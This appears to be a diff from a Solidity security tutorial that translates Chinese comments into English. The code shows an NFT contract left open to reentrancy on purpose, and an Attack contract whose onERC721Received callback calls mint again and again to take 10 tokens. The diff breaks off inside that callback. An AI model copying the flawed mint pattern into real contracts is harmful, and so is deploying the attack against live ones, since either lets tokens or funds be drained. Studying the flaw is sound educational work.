@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 // By 0xAA
+// English translation by yzhX
 pragma solidity ^0.8.4;
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 
@@ -7,37 +8,37 @@ import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 contract NFTReentrancy is ERC721 {
     uint256 public totalSupply;
     mapping(address => bool) public mintedAddress;
-    // 构造函数，初始化NFT合集的名称、代号
+    // Constructor to initialize the name and symbol of the NFT collection
     constructor() ERC721("Reentry NFT", "ReNFT"){}
 
-    // 铸造函数，每个用户只能铸造1个NFT
-    // 有重入漏洞
+    // Mint function, each user can only mint 1 NFT
+    // Contains a reentrancy vulnerability
     function mint() payable external {
-        // 检查是否mint过
+        // Check if already minted
         require(mintedAddress[msg.sender] == false);
-        // 增加total supply
+        // Increase total supply
         totalSupply++;
-        // mint
+        // Mint the NFT
         _safeMint(msg.sender, totalSupply);
-        // 记录mint过的地址
+        // Record the minted address
         mintedAddress[msg.sender] = true;
     }
 }
 
-contract Attack is IERC721Receiver{
-    NFTReentrancy public nft; // Bank合约地址
+contract Attack is IERC721Receiver {
+    NFTReentrancy public nft; // Address of the NFT contract
 
-    // 初始化NFT合约地址
+    // Initialize the NFT contract address
     constructor(NFTReentrancy _nftAddr) {
         nft = _nftAddr;
     }
     
-    // 攻击函数，发起攻击
+    // Attack function to initiate the attack
     function attack() external {
         nft.mint();
     }
 
-    // ERC721的回调函数，会重复调用mint函数，铸造10个
+    // Callback function for ERC721, repeatedly calls the mint function to mint 10 NFTs
     function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
         if(nft.balanceOf(address(this)) < 10){
             nft.mint();
